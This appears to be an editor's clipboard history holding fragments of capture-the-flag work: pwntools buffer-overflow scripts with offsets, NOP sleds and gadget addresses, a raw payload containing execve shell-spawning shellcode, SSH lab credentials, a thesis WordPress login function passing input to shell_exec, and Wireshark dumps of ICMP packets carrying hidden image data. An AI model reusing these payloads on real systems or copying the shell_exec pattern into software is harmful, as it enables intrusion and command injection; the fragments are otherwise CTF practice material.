	log.info("Found jmp rsp at %#x" % jmp_rsp)
eed58eb57914cc17d139b7779452a80d|file:///home/neo/ccsc/guydebois/skeleton.py|26|17|v|python
	jmp rsp at
f711dcfa9b26056546ad69fb7b851772|file:///home/neo/ccsc/guydebois/skeleton.py|26|43|v|python
	jmp_rsp
9ebdfd1f69ac646462e7a6a355a91993|file:///home/neo/ccsc/guydebois/skeleton.py|25|19|v|python
	vuln
9517b56687fc787b22a41d6309941d70|file:///home/neo/ccsc/guydebois/skeleton.py|43|17|v|python
	gadget_addr
c063d0bd18ba4599c3a22b6a50823615|file:///home/neo/ccsc/guydebois/skeleton.py|43|12|v|python
	pack(gadget)
305f2c2be1993430e0808181e5be473e|file:///home/neo/ccsc/guydebois/test.py|4|22|v|python
	i386
4b14f06347fe812f7c042545d9b3f2eb|file:///home/neo/ccsc/guydebois/test.py|6|1|V|python
	# Connect to the server with SSH
	ssh_connection = ssh('buffer', '192.168.0.14', password='password', port=22)
	
	# Open a shell to write more stuff to
	bash = ssh_connection.run('bash')
80e1434ff1735565d95ed2a797a72802|file:///home/neo/ccsc/guydebois/skeleton.py|5|1|V|python
	binary = './chall'
	elf = ELF(binary)
	context.binary = binary
	PROCESS = [binary]
	context.terminal = ['tilix', '-a', 'app-new-session', '-e']
d574d4bb40c84861791a694a999cce69|file:///home/neo/ccsc/guydebois/test.py|14|5|v|python
	bash
2394f8d6ede17684ba8a3ce689f7318d|file:///home/neo/ccsc/guydebois/test.py|14|17|v|python
	python -c "print \'A\'*
2a4e4a281458dd14615a8affbbba580f|file:///home/neo/ccsc/guydebois/test.py|14|26|v|python
	 + '" | ./chall'
06e1f762a57c149084696b4ebfe0d2f4|file:///home/neo/ccsc/guydebois/test.py|17|5|V|python
	    received += r.recvline(timeout=0.03)  # Segmentation fault if crash else empty
84b81812820672f852a17fccc17cb9e6|file:///home/neo/ccsc/guydebois/test.py|17|1|V|python
	    log.info("Received: %s" % received)
ac5bb077c33753116b5e91ff1766e7bc|file:///home/neo/ccsc/guydebois/test.py|15|15|v|python
	Received
6cc0e00b136847f06d0119f9de717792|file:///home/neo/ccsc/guydebois/test.py|15|25|v|python
	Witcher
b77e7e443c0cf2837287653ad146b47c|file:///home/neo/ccsc/guydebois/test.py|14|1|V|python
	Guillaume: Witcher! I've a prime urgency and import! I must speak to you!
ddb140d59642fd886c87c2873e080dac|file:///home/neo/ccsc/guydebois/test.py|16|5|V|python
	    log.info("Menu: %s" % menu)
146a8909f13f20e223c3aaf345db878c|file:///home/neo/ccsc/guydebois/test.py|18|1|V|python
	    received = r.recvline(timeout=0.03)  # output from program
0d9b96edf4c89d04d15792e457614d3c|file:///home/neo/ccsc/guydebois/test.py|18|27|v|python
	timeout=0.03
bcf2d7304d313030ef9ba6d5fc7df614|file:///home/neo/ccsc/guydebois/test.py|19|27|v|python
	meout=0.03
dba559566e3d2e95fa9e2f05314b9a7b|file:///home/neo/ccsc/guydebois/test.py|19|28|v|python
	  # output from program
442722dec6e57209a0c5d206495ce1de|file:///home/neo/ccsc/guydebois/test.py|12|1|V|python
	r = process(PROCESS)
db4ada301837f130129d471c291539ca|file:///home/neo/ccsc/guydebois/test.py|17|5|V|python
	    r.sendline('a')
795ae3eb91f1bf01ae2f7626b56d1213|file:///home/neo/ccsc/guydebois/test.py|21|9|V|python
	        # For some reason when sent through pwntools the buffer to crash was 1 length longer than
c4f1e0e4403424f58df5f93d07ab31c8|file:///home/neo/ccsc/guydebois/test.py|21|9|V|python
	        # it should have been?
8c945a305d7abd9982afb8ed9e384067|file:///home/neo/ccsc/guydebois/test.py|13|5|V|python
	    r = process(PROCESS)
078cd4546246c660cf646bb80df3c8ec|file:///home/neo/ccsc/guydebois/skeleton.py|26|1|V|python
	log.info("Found gadget function at %#x" % gadget)
5d695cc28c6a7ea955162fbdd0ae42b9|file:///home/neo/ccsc/guydebois/skeleton.py|35|11|v|python
	Found
5e11ed1a937eb40df88e24e33deb849a|file:///home/neo/ccsc/guydebois/skeleton.py|35|11|v|python
	c gadget
751af15ab119c70c0cc1190c419bb403|file:///home/neo/ccsc/guydebois/skeleton.py|35|11|v|python
	 function at %#x
1296e6a70fda4de0b5cdc0e7d763ea29|file:///home/neo/ccsc/guydebois/skeleton.py|45|12|v|python
	p64(0x9090909090909090)
226d887d512e42abf0fe922fe2c81cba|file:///home/neo/ccsc/guydebois/skeleton.py|46|11|v|python
	 asm('nop')*8
e41a2cb50c3362f0015404effec8761e|file:///home/neo/ccsc/guydebois/skeleton.py|34|19|v|python
	gadget
903ba310ec0723612790f2b425494c22|file:///home/neo/ccsc/guydebois/skeleton.py|34|1|V|python
	# gadget_addr = p64(0x0000000000400667)
8b1e45b9b414f9b156707069c6f57c1c|file:///home/neo/ccsc/guydebois/skeleton.py|35|19|v|python
	0x0000000000400667
f1768b522f07cae06bdcb0668272e325|file:///home/neo/ccsc/guydebois/skeleton.py|40|1|V|python
	# shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00"
dd1434433e2f83f9278574e6e4e13deb|file:///home/neo/ccsc/guydebois/skeleton.py|36|1|V|python
	log.info("Gadget addr %s" % gadget)
5d4d3d8f1d860e75116d124e0617ef0f|file:///home/neo/ccsc/guydebois/skeleton.py|40|1|V|python
	nop_sled = asm('nop')*8 
e825e9d6f330f2c297156696173d41ef|file:///home/neo/ccsc/guydebois/skeleton.py|48|1|V|python
	log.info(repr(payload))
e576b8f8705a05b743e2b4f9cc242a54|file:///home/neo/ccsc/guydebois/skeleton.py|48|10|V|python
	# log.info(repr(payload))
	log.info(repr(payload))
18c42f07474fce28f7f15769532a2793|file:///home/neo/ccsc/guydebois/skeleton.py|49|1|V|python
	log.info(payload)
b263019a3d1bd9b8f01311c9a50932d3|file:///home/neo/ccsc/guydebois/skeleton.py|43|1|V|python
	payload = 'A' * offset
75d4dbcc85fecfa872e328fa5ceb1dde|file:///home/neo/ccsc/guydebois/skeleton.py|42|1|V|python
	offset = 112
b0caac91f669505ed78b4a9f9b8f5a5e|file:///home/neo/ccsc/jaskier/solve.py|69|1|V|python
	input = str(sys.argv[1])
0a622a81227db936fd553bb8ba58b2ca|file:///home/neo/ccsc/jaskier/solve.py|47|1|V|python
	        for n in range(TABLE_DIM, -1, -1):
6292010dc2bc3abf0c2b5472b41e8de7|file:///home/neo/ccsc/jaskier/solve.py|23|1|V|python
	def h_rotl(pt, rot, size, idx):
	    """
	    Horizontal left rotation. 
	    """
	    m = hmask(size, idx)
	    blk = pt & m 
	    rot = rot % size
	    r = ((blk << rot) | (blk >> (size - rot)))  & m
	    return pt ^ blk | r
c1aaaa1649f29fdedd31c6ce0334402c|file:///home/neo/ccsc/jaskier/solve.py|81|1|V|python
	input = str(sys.argv[1])
	b64dec = base64.b64decode(input)
b10a8db164e0754105b7a99be72e3fe5|file:///home/neo/ccsc/jaskier/solve.py|87|23|v|python
	Hello World
246ff6653172b305265112b53b1c78a4|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|13|16|V|javascript
	        let submitVals = {};
	        submitVals["public_key"] = cred.substr(0,64);
	        submitVals["signature"] = cred.substr(64);
fb53525ef02ecc09a46d945a814cd8e6|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|12|1|V|javascript
	        let signature = cred.substr(64);
	        let submitVals = {};
	        submitVals["public_key"] = cred.substr(0,64);
	        submitVals["signature"] = cred.substr(64);
a999f6a825ed65e34629346394238122|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|17|9|V|javascript
	        console.log(submitVals);
02edce3bbcbc4bd3d531c63f8fe42b17|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|18|34|v|javascript
	sigwnature
408537e7f4e88a6d4d9de57aa22bc2a5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2357|1|V|php
		function check_public_key( $credentials, $stored_pk, $user_id = '' ) {
	        $message = "af82";
	        //$stripped = stripslashes($credentials);
	        /* if (hash_equals($public_key, $stored) == true){ */
	        //$jenc = json_encode($stripped);
	        //$obj = json_decode($jenc,true);
	        //$public_key = $obj["public_key"];
	        //$signature = $obj["signature"];
	        $command = escapeshellcmd("python /var/www/html/verify.py $stored_pk $message $signature");
	        $output = shell_exec($command);
	        echo $output;
	        if ($output == 1){
	            $check = true;
	        } else {
	            $check = false;
	        }
	        /* } else{ */
	        /*     $check = false; */
	        /* } */ 
	
			return apply_filters( 'check_password', $check, $signature, $stored_pk, $user_id );
		}
cbaaf8fee2161bf86654369b6ac7b70c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2334|1|V|php
	
	            echo $public_key;
	            echo $signature;
5f7070d8f4243efd00b88e1072d4be23|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|13|V|php
	                    echo "Wrong length!";
90272dda245ae1fb3cf197e91a8689dc|file:///home/neo/ccsc/guydebois/getshell.py|4|19|v|python
	timeout
e9ffaee7990e5fd1b910c92d689e9264|file:///home/neo/ccsc/guydebois/skeleton.py|44|1|V|python
	payload += gadget_addr
00e3e770517280d4131bd770f733950b|file:///home/neo/ccsc/guydebois/skeleton.py|44|1|V|python
	payload += nop_sled
cdb3150aa839a683230b1ad1dbad0abc|file:///home/neo/ccsc/guydebois/skeleton.py|43|11|v|python
	asm('nop')
fdf26e38bba58862ca9fb2030ae522f9|file:///home/neo/ccsc/guydebois/skeleton.py|36|11|v|python
	Found gadget function at %#x
6f6a51379f3465b8da956d21118640ff|file:///home/neo/ccsc/guydebois/exploit.py|60|34|v|python
	,filler='a'}
87b682a3a10fdaf1e099fb6be30a0b8e|file:///home/neo/ccsc/guydebois/exploit.py|60|35|v|python
	, filler="a"
ad3967bc5c2541ddafd3a80f96d7d858|file:///home/neo/ccsc/guydebois/exploit.py|59|1|V|python
	io.recvline()
5bca567a28ff7895a1ed803b201e6fa0|file:///home/neo/ccsc/guydebois/exploit.py|60|1|V|python
	log.info("Received line: " % line)
dda01bd008318a28432baa7cd3ba9d11|file:///home/neo/ccsc/guydebois/exploit.py|66|1|V|python
	# io.recvline()
321be72083e16d79ddc9287b82b438b1|file:///home/neo/ccsc/guydebois/exploit.py|64|1|V|python
	line = io.recvline()
d27d550ca6c784b636352d522795171a|file:///home/neo/ccsc/guydebois/exploit.py|66|1|V|python
	log.info("Received line: %s" % line)
fb2cd3de425e4dd7fe9a5bb263e681f0|file:///home/neo/ccsc/guydebois/exploit.py|66|1|V|python
	line = io.recvline()
	log.info("Received line: %s" % line)
482745c18c28285418998bc618d4a3dd|file:///home/neo/ccsc/guydebois/exploit.py|66|1|V|python
	line = io.recvline()
	log.info("Received line: %s" % line)
	line = io.recvline()
	log.info("Received line: %s" % line)
fa8384876ea822ed1cea641fbba5163e|output:/Python|234|1|V|log
	##########Linting Output - pylint##########
	
843a9023da9f5f28696ed4a762a2f8ad|file:///home/neo/ccsc/guydebois/exploit.py|64|1|V|python
	line = io.recvuntil("to you!")
a6b6dd36cd5a70e04551bfdd80903cc5|file:///home/neo/ccsc/guydebois/exploit.py|66|10|V|python
	io.sendline('A')
	line = io.recvuntil("to you!")
	print(line)
8bf5cd8b81c736deeab9c2e33ed0aef8|file:///home/neo/ccsc/guydebois/exploit.py|63|1|V|python
	line = io.recvline()
	# log.info("Received line: %s" % line)
60ce70f55fdfe88fc918142a0181e363|file:///home/neo/ccsc/guydebois/shellcode.txt|37|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
280e564589085a1cf36768f531f0a533|file:///home/neo/ccsc/echoes/bytes.txt|1|1|V|text
	no.     time           source                destination           protocol length info
	    236 18.558155776   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 237)
	
	Frame 236: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x0d6e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 237]
	    Data (622 bytes)
	
323d4b591bb9631c71d5eba6136dc2a1|file:///home/neo/ccsc/echoes/bytes.txt|40|1|V|text
	        data: 89504e470d0a1a0a0000000d49484452000001c2000000fd‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    238 19.096002086   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 239)
	
	Frame 238: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa3f4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 239]
	    Data (622 bytes)
	
07d9ceff2eeaeb1ec3b690e80d65f9e3|file:///home/neo/ccsc/echoes/bytes.txt|156|1|V|text
	    Data (622 bytes)
	
	0000  02 9e 85 4a 7a 1b 43 1d 6b 81 8f a2 18 f8 db a1   ...Jz.C.k.......
	0010  7d 4f 0e 75 bc 14 f8 7c 68 e7 2a e0 5e e0 54 e0   }O.u...|h.*.^.T.
	0020  97 c0 eb 42 1f 1c ca f8 bc 14 55 1f bf 07 18 03   ...B......U.....
	0030  b6 00 6f 03 b6 f6 19 db 73 81 cf 52 ee 9d 09 54   ..o.....s..R...T
	0040  42 8d 6b a3 ce 39 fb 51 95 7a ce 0d 6d 59 8e ee   B.k..9.Q.z..mY..
	0050  2f 41 f7 c8 5f a0 e3 fb 6e 74 dc ff 10 25 ea 12   /A.._...nt...%..
	0060  fa f7 ee 3e ed 79 3f 30 85 8e dd 9f 01 c7 02 7f   ...>.y?0........
	0070  8a aa 8d df 0d bc 13 35 61 1c 1d c6 ef 1c e0 ff   .......5a.......
	0080  02 67 a2 f3 be 37 ba 26 23 24 e8 7a 7d 79 78 7e   .g...7.&#$.z}yx~
	0090  df ca bd 1c 1d cf 1a d8 6d 08 21 74 3b 9f f8 1a   ........m.!t;...
	00a0  0f e9 51 a3 e5 d9 3a da 74 4a 75 3d cd ad f1 f0   ..Q...:.tJu=....
	00b0  2e 6c a2 ce a9 1b bc 84 3f f1 28 59 34 1d 52 9d   .l......?.(Y4.R.
	00c0  f7 3e 3c 27 08 4e 9f b3 16 6b 2d 62 0c 22 b6 88   .><'.N...k-b."..
	00d0  2f 12 11 f2 3c ef db b3 ce b6 f9 d8 99 81 fa 5c   /...<..........\
	00e0  be d6 1b 54 5b 5e 9b 87 4b fb f3 c3 e7 7f a1 7a   ...T[^..K......z
	00f0  8c 9f a2 1b fa 1b 94 84 e6 77 51 24 7f 1a ba c1   .........wQ$....
	0100  6f 46 37 e3 63 50 84 66 51 02 f3 4e 14 a1 dd dd   oF7.cP.fQ..N....
	0110  55 c7 32 54 6d 94 a3 08 65 2f 74 e3 58 e0 60 14   U.2Tm...e/t.X.`.
	0120  e9 fd 0a dd 8c ff 2f 3c bb 31 b4 e9 19 28 11 dc   ....../<.1...(..
	0130  84 6e c2 8f a2 44 f8 9e 69 fa b4 2d 94 b5 13 38   .n...D..i..-...8
	0140  11 f8 73 14 21 6e 06 3e 00 fc 20 f4 e7 28 94 08   ..s.!n.>.. ..(..
	0150  1c 8d 22 b9 7e 84 f0 2a e0 26 94 c0 7c 06 45 ac   ..".~..*.&..|.E.
	0160  bf 46 19 84 c7 a1 6a b1 2f a3 88 ec 96 30 6e a7   .F....j./....0n.
	0170  a1 88 f5 e3 7d ca 5c 19 be df 8f aa 5d 4f 00 de   ....}.\.....]O..
	0180  15 c6 e6 64 14 81 be 0c 65 46 de 85 4a 0e a7 87   ...d....eF..J...
	0190  31 f9 53 94 79 79 10 25 14 3b 50 44 f7 66 54 f2   1.S.yy.%.;PD.fT.
	01a0  ee 07 ff 03 25 b4 ff 13 b5 69 1d 1b c6 e8 7c e0   ....%....i....|.
	01b0  8b c0 13 c3 38 7c 0b 45 84 bf 44 99 87 37 a1 84   ....8|.E..D..7..
	01c0  e4 9f 43 bd ef 43 c7 ff c3 28 51 f9 2e 70 2b 8a   ..C..C...(Q..p+.
	01d0  78 3f 1c c6 27 41 a5 84 d3 80 db 42 db 72 14 09   x?..'A.....B.r..
	01e0  bf 08 5d 2b af 46 ed 77 69 68 df 86 50 de ab 50   ..]+.F.wih..P..P
	01f0  22 f2 4e 74 8d dc d5 a7 3f 37 02 d7 a0 f3 7d 26   ".Nt....?7....}&
	0200  4a b0 5b e8 fa bd 1b 55 93 5e 8a ae bf 68 e7 7a   J.[....U.^...h.z
	0210  04 ba b6 2f 0a 6d 39 16 65 6c fe 04 5d 27 7b 01   .../.m9.el..]'{.
	0220  1f 09 6d fa ef e8 3c ff 13 ba 37 76 4e 33 b6 1b   ..m...<...7vN3..
	0230  50 86 a6 85 ae ed f7 a1 0c 4c 5c 1b b7 d5 bc 73   P........L\....s
	0240  47 68 cb c1 e8 bc 6e 47 99 c8 af a0 0c c5 df a0   Gh....nG........
	0250  6b e3 0e 74 1d 3c 3c 94 77 3e ca 40 4c d7 9e ff   k..t.<<.w>.@L...
	0260  42 99 97 cf a0 73 bd 19 65 e2 36 85 71 7a         B....s..e.6.qz
	        Data: 029e854a7a1b431d6b818fa218f8dba17d4f0e75bc14f87c‚Ä¶
	        [Length: 622]
9d1968f3bb1d615e68f296408bbfda16|file:///home/neo/ccsc/echoes/bytes.txt|156|1|V|text
	        Data: 54e8fb5fa30cc79b429debd1b1ff6b94a847497413ca949d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    244 20.721862538   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 245)
	
	Frame 244: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6518 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 245]
	    Data (622 bytes)
	
139bb2d8dea055c4ded4deadc05a2cf7|file:///home/neo/ccsc/echoes/bytes.txt|79|16|v|text
	4e76443d7f5038117ccb3ecb9c00ae0bf01fbd4dcfb6fc0‚Ä¶
d655e0224ce3a4a6472c69135df35006|file:///home/neo/ccsc/echoes/bytes.txt|40|13|v|text
	: 89504e470d0a1a0a0000000d49484452000001c2000000fd‚Ä¶
0ac9590386aaca1d07aef75e05630c10|file:///home/neo/ccsc/echoes/bytes.txt|40|1|V|text
	        Data: 89504e470d0a1a0a0000000d49484452000001c2000000fd‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    238 19.096002086   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 239)
	
	Frame 238: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa3f4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 239]
	    Data (622 bytes)
	
b65dc3adead8f2717742a59014601c69|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 44e76443d7f5038117ccb3ecb9c00ae0bf01fbd4dcfb6fc0‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    240 19.646379372   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 241)
	
	Frame 240: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x59df [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 241]
	    Data (622 bytes)
	
766faa06da29bcd90a26a82358bf23f8|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 029e854a7a1b431d6b818fa218f8dba17d4f0e75bc14f87c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    242 20.182144194   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 243)
	
	Frame 242: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8417 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 243]
	    Data (622 bytes)
	
939042951f9ad5734c2d7e0f769d4ea3|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4df83014f9be1355136d4655245b514e766f1479dc8972b5‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    246 21.261423402   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 247)
	
	Frame 246: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x1532 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 247]
	    Data (622 bytes)
	
d01223afbe04952d2b0b5f4bcda2c0fc|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: b6b35f2b17a2f5159ba0e8d866b923cb1cdee5e57d0c8229‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    250 22.349934391   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 251)
	
	Frame 250: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x08d2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 251]
	    Data (622 bytes)
	
6dd04a9c7f931ee61bdb3c94903246a4|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: ef67a8b4bdbeabdc6f50da45d7a3eb762ef0755472ba08ed‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    248 21.807966938   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 249)
	
	Frame 248: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5c23 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 249]
	    Data (622 bytes)
	
5c0dfd668cafa2e3baf083610919335e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 7a7e5e6baa0d120286fa1dd9eccbf8f3996aad19d5f01d88‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    252 22.897808179   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 253)
	
	Frame 252: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xcb37 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 253]
	    Data (622 bytes)
	
a1002e5b13cfd35e894651e7663d4e52|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: b240d1796c213444f38561e29cde24f5503208d530a5b98f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    254 23.442843209   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 255)
	
	Frame 254: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x45a9 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 255]
	    Data (622 bytes)
	
e81e7da3de5800bd8e51b6684b2d8a7c|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 89d369dd7b9ea9127689d95ba0d56ad16e6525ef1abdbf06‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    258 24.545710665   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 259)
	
	Frame 258: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x3a77 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 259]
	    Data (622 bytes)
	
4e4789d5a848d4ea509e5da33f8edc1b|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: d368507b18bb91c36c44d899ae7512c4e29714f262f9e452‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    256 24.008387250   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 257)
	
	Frame 256: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xbf39 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 257]
	    Data (622 bytes)
	
be7244d742d5805d47a04d7488d30dff|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 7541b2d2d4c22cd663d781981210e5439d207ae7c9b2f2dc‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    262 25.621432623   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 263)
	
	Frame 262: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
